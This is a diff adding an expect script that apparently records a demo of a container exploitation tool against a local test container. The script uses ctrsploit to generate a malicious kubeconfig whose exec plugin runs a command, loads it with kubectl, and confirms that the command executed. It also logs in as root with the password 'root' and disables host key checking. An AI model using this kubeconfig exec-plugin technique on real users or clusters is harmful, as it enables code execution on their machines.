@@ -1,0 +1,37 @@
+#!/usr/bin/expect -f
+set timeout 30
+
+# Suppress all connection and setup noise
+log_user 0
+spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 13512 root@localhost
+expect "password:" { send "root\r" }
+expect "# " { send "\r" }
+expect "# "
+
+# Clean up from previous runs
+send "rm -f /tmp/whoami ~/malicious-kubeconfig.yaml\r"
+expect "# "
+
+# Enable visible output at a clean prompt
+log_user 1
+
+sleep 0.8
+
+# Stage 1: generate malicious kubeconfig
+send "ctrsploit vul kubeconfig user-exec x -c 'id > /tmp/whoami'\r"
+expect "# "
+sleep 1.2
+
+# Stage 2: load with kubectl — exec plugin fires before network request.
+# Pipe through grep to show only the meaningful error line.
+send "kubectl --kubeconfig ~/malicious-kubeconfig.yaml get pods 2>&1 | grep Unable\r"
+expect "# "
+sleep 1.5
+
+# Stage 3: verify the exec plugin executed
+send "cat /tmp/whoami\r"
+expect "# "
+sleep 4.5
+
+send "exit\r"
+expect eof
